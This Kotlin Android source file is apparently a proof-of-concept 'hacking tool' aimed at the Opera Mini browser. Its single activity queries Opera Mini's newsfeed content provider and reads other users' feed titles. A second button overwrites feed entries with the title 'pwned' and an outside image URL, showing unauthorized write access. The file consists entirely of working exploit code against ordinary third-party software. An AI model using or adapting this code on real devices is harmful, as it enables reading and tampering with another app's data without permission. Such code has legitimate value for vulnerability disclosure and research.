package org.evgem.android.operaminisuperhackingtool2019

import android.content.ContentValues
import android.net.Uri
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import kotlinx.android.synthetic.main.activity_main.*

class MainActivity : AppCompatActivity() {
    private val uri = Uri.Builder()
        .authority("com.opera.mini.native.newsfeed")
        .scheme("content")
        .path("newsfeed")
        .build()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        get_button.setOnClickListener {
            contentResolver.query(uri, null, null, null, null)?.use {
                val sb = StringBuilder()
                while (it.moveToNext()) {
                    sb.append(it.getString(it.getColumnIndex("title")))
                    sb.append('\n')
                }
                data.text = sb.toString()
            }
        }

        put_button.setOnClickListener {
            val values = ContentValues()
            values.put("title", "pwned")
            values.put("original_img_url", "http://i39.tinypic.com/x3771s.jpg")
            contentResolver.update(uri, values, "type = ?", arrayOf("normal"))
        }
    }
}
